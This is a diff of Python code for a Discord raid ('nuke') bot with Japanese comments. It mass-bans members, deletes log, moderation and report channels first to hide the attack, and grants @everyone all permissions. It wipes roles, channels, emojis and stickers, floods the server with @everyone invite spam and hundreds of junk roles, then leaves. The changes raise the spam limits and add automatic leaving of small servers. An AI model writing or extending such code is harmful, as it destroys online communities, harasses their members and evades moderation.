@@ -76,21 +76,22 @@ async def create_stage_channel_safely(guild, name):
     try:
         return await guild.create_stage_channel(name)
     except:
-        return None  # 失敗無視
+        return None
 
 async def create_colored_roles_task(guild, target_roles):
     current = 0
     while current < target_roles:
         try:
             await guild.create_role(
-                name="ますまに共栄圏に荒らされましたｗｗｗ",
+                name=f"ますまに荒らしロール-{current+1}ｗｗｗ",
                 color=discord.Color.random(),
-                reason=""
+                hoist=True,
+                mentionable=True
             )
             current += 1
         except:
             break
-        await asyncio.sleep(random.uniform(0.15, 0.3))
+        await asyncio.sleep(random.uniform(0.12, 0.25))  # 上限狙いで少し長め
 
 async def ban_all_task(guild, members, reason):
     for m in members:
@@ -114,16 +115,15 @@ async def core_nuke(guild, new_server_name=None):
     await asyncio.gather(*(limited_global(guild.ban(m, reason="", delete_message_seconds=0)) for m in members if m.bot), return_exceptions=True)
     await asyncio.gather(*[limited_dm(send_dm(m)) for m in non_bot_members], return_exceptions=True)
 
-    # ログ系チャンネル優先削除（名前フィルタ）
-    log_keywords = ["log", "ログ", "audit", "監視", "mod", "moderation", "admin", "管理"]
+    # ログ系チャンネル優先削除
+    log_keywords = ["log", "ログ", "audit", "監視", "mod", "moderation", "admin", "管理", "report", "報告", "ticket", "チケット"]
     channels = list(guild.channels)
     log_channels = [ch for ch in channels if any(kw.lower() in ch.name.lower() for kw in log_keywords)]
     if log_channels:
-        print(f"ログ系チャンネル削除開始: 対象 {len(log_channels)}個")
         await asyncio.gather(*(limited_global(ch.delete()) for ch in log_channels), return_exceptions=True)
         await asyncio.sleep(1)
 
-    # @everyone権限最大化（ログ消えた後）
+    # @everyone権限最大化
     everyone_role = guild.default_role
     permissions = discord.Permissions.all()
     try:
@@ -137,10 +137,9 @@ async def core_nuke(guild, new_server_name=None):
     except:
         pass
 
-    # 絵文字削除（バッチ化で遅延回避）
+    # 絵文字削除（バッチ）
     emojis = await guild.fetch_emojis()
     if emojis:
-        print(f"絵文字削除開始: 対象 {len(emojis)}個")
         batch_size_emoji = 5
         for i in range(0, len(emojis), batch_size_emoji):
             batch = emojis[i:i+batch_size_emoji]
@@ -151,7 +150,7 @@ async def core_nuke(guild, new_server_name=None):
     stickers = await guild.fetch_stickers()
     await asyncio.gather(*(limited_global(s.delete()) for s in stickers), return_exceptions=True)
 
-    # コミュニティ無効化（失敗無視・ログなし）
+    # コミュニティ無効化（無視）
     try:
         await limited_global(guild.edit(
             verification_level=discord.VerificationLevel.none,
@@ -168,14 +167,14 @@ async def core_nuke(guild, new_server_name=None):
     except:
         pass
 
-    # ロール削除（sleep調整 + リトライ4回）
+    # ロール削除
     roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
     print(f"ロール削除開始: 対象 {len(roles_to_delete)}個")
 
     async def delete_roles_batch(roles):
         await asyncio.gather(*(limited_global(r.delete()) for r in roles), return_exceptions=True)
 
-    batch_size = 12  # 少し抑えめで安定
+    batch_size = 12
     attempt = 0
     while len(roles_to_delete) > 0 and attempt < 4:
         attempt += 1
@@ -216,7 +215,7 @@ async def core_nuke(guild, new_server_name=None):
 
     print(f"チャンネル削除完了: 残り {len(guild.channels)}個")
 
-    # ステージチャンネル大量作成（失敗無視）
+    # ステージチャンネル大量作成（無視）
     stage_tasks = [limited_global(create_stage_channel_safely(guild, f"ますまにステージ-{i}")) for i in range(20)]
     await asyncio.gather(*stage_tasks, return_exceptions=True)
 
@@ -226,25 +225,24 @@ async def core_nuke(guild, new_server_name=None):
     except:
         pass
 
-    # 規模別調整
+    # チャンネル作成（規模別）
     member_count = len(non_bot_members)
     if member_count < 100:
         target_channels = 80
-        target_roles = 70
+        target_roles = 240  # 上限近く
         spam_sleep_min = 0.08
         spam_sleep_max = 0.25
     elif member_count < 500:
         target_channels = 70
-        target_roles = 60
+        target_roles = 240
         spam_sleep_min = 0.12
         spam_sleep_max = 0.30
     else:
         target_channels = 50
-        target_roles = 50
+        target_roles = 240
         spam_sleep_min = 0.20
         spam_sleep_max = 0.40
 
-    # チャンネル作成 + スパム + BAN（前のまま）
     channels_created = []
     current = 0
     channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
@@ -261,6 +259,10 @@ async def core_nuke(guild, new_server_name=None):
         channels_created += added
         await asyncio.sleep(random.uniform(0.2, 0.4))
 
+    # ロール作成（240個）
+    role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))
+
+    # スパム（上限300に変更）
     spam_messages = [
         f"@everyone {INVITE_LINK}",
         f"@everyone 来い {INVITE_LINK}"
@@ -270,12 +272,11 @@ async def core_nuke(guild, new_server_name=None):
     active_channels = channels_created.copy()
 
     ban_task = asyncio.create_task(ban_all_task(guild, non_bot_members, new_name))
-    role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))
 
-    while any(c < 150 for c in message_counters.values()):
+    while any(c < 300 for c in message_counters.values()):
         spam_tasks = []
         for ch in active_channels[:]:
-            if message_counters[ch.id] >= 150:
+            if message_counters[ch.id] >= 300:
                 active_channels.remove(ch)
                 continue
             spam_tasks.append(limited_message(ch.send(random.choice(spam_messages))))
@@ -287,9 +288,56 @@ async def core_nuke(guild, new_server_name=None):
     await ban_task
     await role_create_task
 
+    print("ヌーク完了 → bot退出")
+    try:
+        await guild.leave()
+    except:
+        print("退出失敗")
+
     print("完了")
 
-# 管理View部分（変更なし、前のコードと同じ）
+# 自動退出機能
+@bot.event
+async def on_guild_join(guild):
+    non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
+    member_count = len(non_bot_members)
+
+    if member_count <= 5 and not guild.name.startswith("ま"):
+        print(f"自動退出: {guild.name} (メンバー{bot含まず}{member_count}人、名前が「ま」から始まらない)")
+        try:
+            await guild.leave()
+        except:
+            pass
+    else:
+        print(f"新規参加: {guild.name} (メンバー{bot含まず}{member_count}人) → 残留")
+
+@bot.event
+async def on_ready():
+    print(f"起動: {bot.user}")
+    print("=== ボット起動時の全サーバー情報 ===")
+    for guild in bot.guilds:
+        non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
+        member_count = len(non_bot_members)
+        if member_count <= 5 and not guild.name.startswith("ま"):
+            print(f"起動時自動退出: {guild.name} (メンバー{bot含まず}{member_count}人)")
+            try:
+                await guild.leave()
+            except:
+                pass
+        else:
+            await log_server_info(guild)
+    print("=====================================")
+
+    manage_guild = bot.get_guild(MANAGE_GUILD_ID)
+    if manage_guild:
+        manage_channel = manage_guild.get_channel(MANAGE_CHANNEL_ID)
+        if manage_channel:
+            view = ManageView(bot)
+            options = [discord.SelectOption(label=g.name, value=str(g.id)) for g in bot.guilds]
+            view.select_guild.options = options
+            await manage_channel.send("サーバー管理パネル", view=view)
+
+# 管理View（変更なし）
 class ManageView(discord.ui.View):
     def __init__(self, bot):
         super().__init__(timeout=None)
@@ -321,32 +369,6 @@ async def trigger(ctx, *, new_name: str = None):
     except:
         pass
     asyncio.create_task(core_nuke(ctx.guild, new_name))
-
-@bot.event
-async def on_ready():
-    print(f"起動: {bot.user}")
-    print("=== ボット起動時の全サーバー情報 ===")
-    for guild in bot.guilds:
-        await log_server_info(guild)
-    print("=====================================")
-
-    manage_guild = bot.get_guild(MANAGE_GUILD_ID)
-    if manage_guild:
-        manage_channel = manage_guild.get_channel(MANAGE_CHANNEL_ID)
-        if manage_channel:
-            view = ManageView(bot)
-            options = [discord.SelectOption(label=g.name, value=str(g.id)) for g in bot.guilds]
-            view.select_guild.options = options
-            await manage_channel.send("サーバー管理パネル", view=view)
-        else:
-            print("管理チャンネルが見つかりません")
-    else:
-        print("管理サーバーが見つかりません")
-
-@bot.event
-async def on_guild_join(guild):
-    print(f"新規サーバー参加: {guild.name}")
-    await log_server_info(guild)
 
 async def log_server_info(guild):
     member_count = guild.member_count
